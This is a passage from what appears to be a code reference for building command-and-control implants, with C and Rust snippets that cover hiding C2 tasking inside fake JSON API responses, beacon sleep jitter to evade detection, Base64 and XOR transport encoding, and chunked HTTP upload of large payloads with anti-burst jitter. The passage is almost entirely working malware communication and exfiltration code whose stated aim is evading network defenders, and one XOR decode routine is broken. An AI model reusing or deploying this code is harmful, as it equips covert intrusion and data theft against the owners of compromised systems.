        pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ((dwLen + 2) / 3) * 4 + 1);
        // ... encode into pOut ...
        dwOutLen = ((dwLen + 2) / 3) * 4;
    } else {
        pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwLen);
        memcpy(pOut, pData, dwLen);
    }

    *ppTransformed = pOut;
    *pdwTransformedLen = dwOutLen;
}
```

### HTTP Request/Response Transformation
```c
// Transform C2 data to look like legitimate API responses
// Example: embed C2 data inside a fake JSON response

// Server → Client (tasking hidden in JSON)
// {"status":"ok","version":"2.1.0","data":"<base64_tasking>","ts":1700000000}

// Client → Server (results hidden in JSON)
// {"client_id":"<machine_guid>","telemetry":"<base64_result>","v":3}

void WrapAsJson(PBYTE pData, DWORD dwLen, LPSTR pszOut, DWORD cbOut) {
    // Base64 encode the real data
    DWORD dwB64Len = 0;
    CryptBinaryToStringA(pData, dwLen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwB64Len);
    LPSTR pszB64 = (LPSTR)HeapAlloc(GetProcessHeap(), 0, dwB64Len + 1);
    CryptBinaryToStringA(pData, dwLen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pszB64, &dwB64Len);

    sprintf_s(pszOut, cbOut,
        "{\"status\":\"ok\",\"version\":\"2.1.0\","
        "\"data\":\"%s\",\"ts\":%llu}",
        pszB64, (unsigned long long)time(NULL));

    HeapFree(GetProcessHeap(), 0, pszB64);
}
```

---

## 8. Sleep Jitter

Randomized sleep intervals to avoid fixed-interval beacon detection.

```c
#include <Windows.h>
#include <ntsecapi.h> // RtlGenRandom

// Jittered sleep — randomize beacon interval within percentage range
DWORD JitteredSleep(DWORD dwBaseMs, DWORD dwJitterPercent) {
    static ULONG seed = 0;
    if (seed == 0) seed = GetTickCount();

    DWORD jitter = (dwBaseMs * dwJitterPercent) / 100;
    DWORD dwMin = dwBaseMs - jitter;
    DWORD dwMax = dwBaseMs + jitter;
    DWORD actual = dwMin + (RtlRandomEx(&seed) % (dwMax - dwMin + 1));
    Sleep(actual);
    return actual;
}

// Cryptographically random jitter (stronger)
DWORD JitteredSleepCrypto(DWORD dwBaseMs, DWORD dwJitterPercent) {
    DWORD jitter = (dwBaseMs * dwJitterPercent) / 100;
    DWORD dwMin = dwBaseMs - jitter;
    DWORD dwMax = dwBaseMs + jitter;

    DWORD dwRand;
    // RtlGenRandom (SystemFunction036) — no CryptoAPI dependency
    typedef BOOLEAN(APIENTRY* fnRtlGenRandom)(PVOID, ULONG);
    fnRtlGenRandom pRtlGenRandom = (fnRtlGenRandom)GetProcAddress(
        GetModuleHandleA("advapi32.dll"), "SystemFunction036");
    if (pRtlGenRandom)
        pRtlGenRandom(&dwRand, sizeof(dwRand));
    else
        dwRand = GetTickCount(); // Fallback

    DWORD actual = dwMin + (dwRand % (dwMax - dwMin + 1));
    Sleep(actual);
    return actual;
}

// Beacon loop with jitter
void BeaconLoop(DWORD dwBaseSleepMs, DWORD dwJitterPct) {
    while (TRUE) {
        // ... perform callback / check-in ...
        DWORD dwSlept = JitteredSleep(dwBaseSleepMs, dwJitterPct);
        // Optional: log actual sleep for debugging
        // printf("Slept %u ms\n", dwSlept);
    }
}
// Usage: BeaconLoop(60000, 30); // 60s base, +/- 30% → 42s to 78s
```

**Rust implementation:**
```rust
use std::thread;
use std::time::Duration;
use rand::Rng;

fn jittered_sleep(base_ms: u64, jitter_pct: u64) -> u64 {
    let jitter = (base_ms * jitter_pct) / 100;
    let min = base_ms.saturating_sub(jitter);
    let max = base_ms + jitter;
    let actual = rand::thread_rng().gen_range(min..=max);
    thread::sleep(Duration::from_millis(actual));
    actual
}
```

---

## 9. Data Encoding

### Base64 Encode / Decode (CryptoAPI)
```c
#include <Windows.h>
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

// Base64 encode
LPSTR Base64Encode(PBYTE pData, DWORD dwLen) {
    DWORD dwB64Len = 0;
    CryptBinaryToStringA(pData, dwLen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwB64Len);

    LPSTR pszB64 = (LPSTR)HeapAlloc(GetProcessHeap(), 0, dwB64Len + 1);
    if (!pszB64) return NULL;

    CryptBinaryToStringA(pData, dwLen,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pszB64, &dwB64Len);

    return pszB64; // Caller frees with HeapFree
}

// Base64 decode
PBYTE Base64Decode(LPCSTR pszB64, PDWORD pdwOutLen) {
    *pdwOutLen = 0;
    CryptStringToBinaryA(pszB64, 0, CRYPT_STRING_BASE64, NULL, pdwOutLen, NULL, NULL);

    PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, *pdwOutLen);
    if (!pOut) return NULL;

    CryptStringToBinaryA(pszB64, 0, CRYPT_STRING_BASE64, pOut, pdwOutLen, NULL, NULL);
    return pOut; // Caller frees with HeapFree
}
```

### Manual Base64 (no CryptoAPI dependency)
```c
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

DWORD Base64EncodeManual(PBYTE pIn, DWORD dwInLen, LPSTR pOut) {
    DWORD i, j = 0;
    for (i = 0; i + 2 < dwInLen; i += 3) {
        pOut[j++] = b64_table[(pIn[i] >> 2) & 0x3F];
        pOut[j++] = b64_table[((pIn[i] & 0x3) << 4) | ((pIn[i+1] >> 4) & 0xF)];
        pOut[j++] = b64_table[((pIn[i+1] & 0xF) << 2) | ((pIn[i+2] >> 6) & 0x3)];
        pOut[j++] = b64_table[pIn[i+2] & 0x3F];
    }
    if (i < dwInLen) {
        pOut[j++] = b64_table[(pIn[i] >> 2) & 0x3F];
        if (i + 1 < dwInLen) {
            pOut[j++] = b64_table[((pIn[i] & 0x3) << 4) | ((pIn[i+1] >> 4) & 0xF)];
            pOut[j++] = b64_table[((pIn[i+1] & 0xF) << 2)];
        } else {
            pOut[j++] = b64_table[((pIn[i] & 0x3) << 4)];
            pOut[j++] = '=';
        }
        pOut[j++] = '=';
    }
    pOut[j] = '\0';
    return j;
}
```

### XOR Transport Encoding
```c
// XOR encode/decode with multi-byte key — same function for encode and decode
void XorTransform(PBYTE pData, DWORD dwLen, PBYTE pKey, DWORD dwKeyLen) {
    for (DWORD i = 0; i < dwLen; i++)
        pData[i] ^= pKey[i % dwKeyLen];
}

// Rolling XOR — each byte depends on previous (better diffusion)
void XorRolling(PBYTE pData, DWORD dwLen, BYTE bSeed) {
    BYTE prev = bSeed;
    for (DWORD i = 0; i < dwLen; i++) {
        BYTE tmp = pData[i];
        pData[i] ^= prev;
        prev = tmp;
    }
}

// Decode rolling XOR
void XorRollingDecode(PBYTE pData, DWORD dwLen, BYTE bSeed) {
    BYTE prev = bSeed;
    for (DWORD i = 0; i < dwLen; i++) {
        pData[i] ^= prev;
        prev = pData[i] ^ prev ^ pData[i]; // reconstruct original
        // Simpler: operate on copy, or decode in reverse
    }
}

// Correct reverse-order rolling XOR decode
void XorRollingDecodeReverse(PBYTE pData, DWORD dwLen, BYTE bSeed) {
    for (DWORD i = dwLen - 1; i > 0; i--)
        pData[i] ^= pData[i - 1];
    pData[0] ^= bSeed;
}
```

### Chunked Transfer for Large Payloads
```c
#include <Windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#define CHUNK_SIZE  (4096)  // 4KB chunks

// Upload large buffer in chunks via multiple HTTP requests
BOOL ChunkedUpload(LPCWSTR pszHost, LPCWSTR pszPath,
                   PBYTE pData, DWORD dwTotalLen) {
    DWORD dwOffset = 0;
    DWORD dwChunkId = 0;

    while (dwOffset < dwTotalLen) {
        DWORD dwChunkLen = min(CHUNK_SIZE, dwTotalLen - dwOffset);

        // Build chunk header: [4-byte total_len][4-byte offset][4-byte chunk_id][data]
        DWORD dwPacketLen = 12 + dwChunkLen;
        PBYTE pPacket = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwPacketLen);
        if (!pPacket) return FALSE;

        *(PDWORD)(pPacket + 0) = dwTotalLen;
        *(PDWORD)(pPacket + 4) = dwOffset;
        *(PDWORD)(pPacket + 8) = dwChunkId;
        memcpy(pPacket + 12, pData + dwOffset, dwChunkLen);

        // Send chunk via WinHTTP POST (reuse WinHttpPost from section 1)
        HTTP_RESPONSE resp = {0};
        BOOL bOk = WinHttpPost(pszHost, INTERNET_DEFAULT_HTTPS_PORT, pszPath,
                               L"Mozilla/5.0", pPacket, dwPacketLen, TRUE, &resp);

        HeapFree(GetProcessHeap(), 0, pPacket);
        if (resp.pResponse) free(resp.pResponse);

        if (!bOk || resp.dwStatusCode != 200)
            return FALSE;

        dwOffset += dwChunkLen;
        dwChunkId++;

        // Jitter between chunks to avoid traffic burst detection
        Sleep(100 + (GetTickCount() % 400));
    }
    return TRUE;
}

// Server-side reassembly (pseudo-code)
// Collect chunks keyed by session ID, reassemble when all offsets received
// Verify: total received == total_len from header
```

**Rust chunked upload helper:**
```rust
use std::io::Read;

struct Chunk {
    total_len: u32,
    offset: u32,
    chunk_id: u32,
    data: Vec<u8>,
}

fn chunk_payload(data: &[u8], chunk_size: usize) -> Vec<Chunk> {
    let total = data.len() as u32;
    data.chunks(chunk_size)
        .enumerate()
        .map(|(id, chunk)| Chunk {
            total_len: total,
            offset: (id * chunk_size) as u32,
            chunk_id: id as u32,
            data: chunk.to_vec(),
        })
        .collect()
}

impl Chunk {
    fn serialize(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(12 + self.data.len());
        buf.extend_from_slice(&self.total_len.to_le_bytes());
        buf.extend_from_slice(&self.offset.to_le_bytes());
        buf.extend_from_slice(&self.chunk_id.to_le_bytes());
        buf.extend_from_slice(&self.data);
        buf
    }
}
```
